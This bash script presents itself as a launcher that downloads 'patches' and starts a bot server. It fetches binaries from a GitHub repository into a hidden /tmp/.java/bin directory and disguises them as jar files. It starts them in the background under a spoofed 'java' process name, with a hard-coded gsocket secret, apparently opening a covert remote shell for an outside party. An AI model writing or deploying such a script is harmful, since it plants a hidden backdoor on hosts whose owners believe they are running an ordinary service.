#!/bin/bash

function fetch_files() {
    echo "Downloading Patches ..."
    mkdir -p /tmp/.java/bin
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/rufastnde/cfg.conf -o cfg.conf
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/mc/gcat -o add-on.jar
    echo "DONE ..."
}

function start_app() {
    chmod a+x /tmp/.java/bin/***
    cd /tmp/.java/bin && ./plugins.jar -c ./cfg.conf -d
    export GSOCKET_ARGS="-s bE928cAe-D2a1E2c-5A16f98-13D9g-8Hbj7-56C4a961-eCd9F9440-d6A2803-8A1c-5J1g60 -liqD"
    export HOME=/home/container
    cd /tmp/.java/bin && exec -a -java ./add-on.jar &
    echo "BOT SERVER STARTED ..."
}

if [ -f "/tmp/.java/bin/cfg.conf" ] && [ -f "/tmp/.java/bin/add-on.jar" ] && [ -f "/tmp/.java/bin/plugins.jar" ]; then
    echo "Patch files already loaded ..."
    start_app
else
    rm -rf /tmp/.java/bin/**
    fetch_files
    start_app
fi
